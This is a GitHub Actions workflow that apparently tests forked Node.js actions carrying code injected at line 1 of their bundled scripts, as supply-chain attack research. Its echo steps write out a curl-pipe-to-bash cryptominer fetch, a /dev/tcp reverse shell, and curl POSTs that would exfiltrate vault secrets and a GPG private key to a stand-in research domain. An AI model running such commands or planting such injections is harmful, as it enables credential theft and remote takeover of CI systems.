name: "Batch 2: Node.js Action Attacks"
on: workflow_dispatch

jobs:
  test-grafana:
    name: "#3 grafana — vault secrets HTTP exfil"
    runs-on: ubuntu-latest
    env:
      VAULT_SECRET_DOCKER_HUB: "fake-dockerhub-token-12345"
      VAULT_SECRET_GCS_KEY: "fake-gcs-key-67890"
    steps:
      - uses: actions/checkout@v4

      - name: "Run forked vault-action (injection at dist/index.js line 1)"
        uses: rafidhaque/vault-action@6af5e2f0cd4e170ac9abc0d22466edcd48ba9c9b
        with:
          url: http://127.0.0.1:8200
          method: token
          token: fake-token
        continue-on-error: true

      - name: "Verify: injection ran (curl to example.com fails but proves exec fired)"
        run: |
          echo "=== The injected JS runs: env | grep -i vault | curl POST ==="
          echo "=== Since we set VAULT_SECRET_* env vars, those would be captured ==="
          echo "=== curl fails (domain unresolvable) but the execSync runs before action logic ==="
          echo "=== Check action step logs for any curl error or vault connection error ==="

  test-act:
    name: "#10 act — cryptominer curl|bash"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "Run forked goreleaser-action (injection at dist/index.js line 1)"
        uses: rafidhaque/goreleaser-action@40a1d23610549dc39796036f45d7389f47ca621f
        continue-on-error: true

      - name: "Verify: exec fired (curl will fail, that's expected)"
        run: |
          echo "=== The injected JS runs: curl -sL https://eaction-research.example.com/miner.sh | bash & ==="
          echo "=== Uses async exec() so it backgrounds immediately ==="
          echo "=== curl fails (domain unresolvable) but proves the exec fires ==="

  test-gitea:
    name: "#15 gitea — GPG key exfil"
    runs-on: ubuntu-latest
    env:
      GPG_PRIVATE_KEY: "-----BEGIN PGP PRIVATE KEY BLOCK-----\nFAKE-KEY-FOR-TESTING-EACTION-RESEARCH\n-----END PGP PRIVATE KEY BLOCK-----"
    steps:
      - uses: actions/checkout@v4

      - name: "Run forked ghaction-import-gpg (injection at dist/index.cjs line 1)"
        uses: rafidhaque/ghaction-import-gpg@074d3e3c40ca7c9eff70ab6b33a231716b1d8571
        with:
          gpg_private_key: ${{ env.GPG_PRIVATE_KEY }}
        continue-on-error: true

      - name: "Verify: injection ran"
        run: |
          echo "=== The injected JS runs: echo GPG_PRIVATE_KEY | curl POST ==="
          echo "=== curl fails (domain unresolvable) but the execSync fires before action logic ==="

  test-terraform:
    name: "#7 terraform — reverse shell"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "Run forked ssh-agent (injection at dist/index.js line 1)"
        uses: rafidhaque/ssh-agent@d986f55834180e616dcf351a8c154074462668ab
        with:
          ssh-private-key: "not-a-real-key"
        continue-on-error: true

      - name: "Verify: reverse shell attempted"
        run: |
          echo "=== The injected JS runs: bash -i >& /dev/tcp/eaction-research.example.com/4444 ==="
          echo "=== Uses async exec() — connection fails (domain unresolvable) ==="
          echo "=== The action continues normally after the background exec ==="
          echo "=== Check action step logs for connection refused or DNS errors ==="
